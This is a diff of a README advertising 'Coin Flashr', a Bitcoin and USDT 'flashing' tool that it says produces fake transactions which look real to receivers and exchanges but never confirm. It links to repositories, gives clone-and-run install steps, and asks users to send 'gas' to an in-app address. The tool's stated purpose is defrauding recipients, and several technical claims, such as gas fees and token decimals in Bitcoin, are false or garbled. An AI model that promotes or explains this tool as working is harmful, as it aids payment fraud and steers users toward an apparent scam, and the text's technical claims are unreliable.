@@ -1,14 +1,19 @@
-## Understanding Bitcoin Flashing
+## Description
 
 ### What is Bitcoin flashing?
 
-Bitcoin flashing primarily refers to a technique where an attacker creates the illusion of a successful Bitcoin transaction, but the funds never actually materialize or are quickly reversed. Bitcoin flashing is a practice of sending Bitcoin from one wallet to another in a transaction that will be rendered invalid in the long run. This is achieved either by manipulating the transaction signature, gas fees, or altering the token decimals programatically.
+Bitcoin flashing is a technique that creates the illusion of a successful Bitcoin transaction, manipulate the receiver's local display to show a fake balance. It is an unconfirmed transaction that will eventually be rejected by the blockchain. This is achieved either by manipulating the transaction signature and the gas fee programatically.
 
-### Bitcoin flashing software
+### Bitcoin flashing software public release
 
-Coin Flashr is a software application that lets users perform dummy transactions with multiple variants of Bitcoin (including Bitcoin Fantom and Wrapped Bitcoin) and USDT (ERC20, BEP20, and TRC20). We developed this software mainly as a proof-of-concept, and only for demonstration purposes. The setup and utilization is entirely dummyproof. Flash tokens have a limited usage range, and they can not be swapped simply due to a lack of liquidity. The practical use case is transfers between cold and hardware wallets. The bitcoin can be sent to an exchange platform, but confirmation will never happen. Flash tokens are identical to the real deal until the user studies the underlying code or attempt to swap them.
+Coin Flashr is a software application that lets users perform dummy transactions with multiple variants of Bitcoin (including Bitcoin Fantom and Wrapped Bitcoin) and USDT (ERC20, BEP20, and TRC20) in less than a minute. This tool can be used on mobile and PC. We developed this software mainly as a proof-of-concept, and only for demonstration purposes. The setup and utilization is entirely dummyproof. Flash tokens have a limited usage range, and they can not be swapped simply due to a lack of liquidity. The practical use case is transfers between cold and hardware wallets. The bitcoin can be sent to an exchange platform, but confirmation will never happen. Flash tokens are identical to the real deal until the user studies the underlying code or attempt to swap them.
 
 The user will have a limited spendable quota of either Bitcoin or USDT, and is responsible for the gas fee for the flashing transactions. The user will find a gas address in-app and the gas topup process is simple.
+
+
+### Bitcoin flashing mobile app (Android/IOS)
+
+Click [here](https://github.com/bitcoin-flashing-mobile-app/public-release) to flash Bitcoin from your mobile phone.
 
 ### Bitcoin flashing source code
 
@@ -110,7 +115,7 @@ You should see output similar to: git version 2.x.x
 1. Clone the repository:
 
 ```sh
-git clone https://github.com/flash-bitcoin-software/public-release && cd public-release
+git clone https://github.com/bitcoin-flashing-free/public-release && cd public-release
 ```
 
 2. Install necessary dependencies:
@@ -125,6 +130,18 @@ npm install && npm install electron
 npm start
 ```
 Gas is required for every non-bitcoin (USDT, wBTC) flashing event.
+
+### Bitcoin flashing software PC preview
+
+https://github.com/user-attachments/assets/baef8306-2495-49a7-8eff-82a7d94017c6
+
+### Bitcoin flashing software iPhone preview
+
+https://github.com/user-attachments/assets/3594c7ad-6f7c-4973-b829-6d34105334df
+
+
+
+
 
 
 
